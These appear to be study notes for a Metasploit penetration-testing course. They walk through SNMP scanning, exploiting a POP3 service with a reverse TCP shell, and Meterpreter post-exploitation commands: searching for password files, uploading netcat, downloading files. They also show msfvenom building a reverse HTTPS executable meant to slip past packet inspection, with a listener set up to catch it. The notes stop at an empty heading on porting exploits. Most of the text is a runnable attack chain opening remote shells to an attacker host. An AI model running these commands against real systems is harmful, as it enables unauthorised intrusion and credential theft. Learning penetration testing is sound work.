**Metasploit:**

written in ruby

Exploit research

1. choose various shellcode to the exploit

Useful in every phase of the pentest

MSF -- unified and sensible interface to use all options

**START **

```
/etc/init.d/metasploit start
/etc/init.d/postgresql start
```

Explore exploits \(Aux modules

**1.Auxilary Modules:**

show Auxilary : info gathering , scanning and enumeration etc

```
show snmp
use /auxiliary/scanner/snmp/snmp_enum
show options
set RHOST 192.168.31.200-254
set THREADS 10
run
```

```
set global parameters can be used across various modules 
setg RHOSTS 192.168.31.200-254
setg THREADS 10
```

**2. Database Services**

```
command to show all the hosts scanned till date :
>> hosts
>> db_nmap 192.168.31.200-254 --top-ports 20
Query the database 
>> services -p 443
```

**3. Exploit Modules**

```
To gain shell , 

>> search pop3
>> use exploit/windows/pop3/seattelab pass

Shellcode 

>> set PAYLOAD windows/shell_reverse_tcp
>> show options
>> set RHOST 192.168.30.35
>> set LHOST 192.168.30.5
>> set LPORT 443

>> exploit
```

**4. Payloads \(Meterpreter\)**

meterpreter is staged payloads  \(Dynamically extended at runtime\) \(more feature and functionalities than a regular shell like : keylogger , file upload and download etc\)

swap any number of shells from the meterpreter session

```
>> set PAYLOAD windows/meterpreter/reverse_tcp
>> show options
>> exploit

after reverse shell
>> sysinfo
>> getuid
>> search -f *pass*.txt
>> upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec
>> download c:\\Windows\\calc.exe /tmp/calc.exe
>> shell

>> exit
>> exit -y (Exit meterpreter)
```

* Reverse HTTPS meterpreter payload : encapsulate requests in HTTPS making it to bypass deep packets inspection tools
* reverse \_tcp \_allports : connect back from victim through ports 

**5.Msfvenom & Multi Handler :**

generate a windows reverse meterpreter pe executable

```
>> msfvenom -p windows/meterpeter/reverse_https LHOST=192.168.30.5 Lport=443 -f exe --platform windows -a x86 > /var/www/reverse_met_https.exe
download it in the victim machine

now set the lister to handle at attacker machine

>> msfconsole
>> use exploit/multi/handler
>> set PAYLOAD windows/meterpreter/reverse_https
>> show options
>> set LHOST 192.168.30.5
>> set LPORT 443
>> exploit
```

**6. Porting Exploit:**





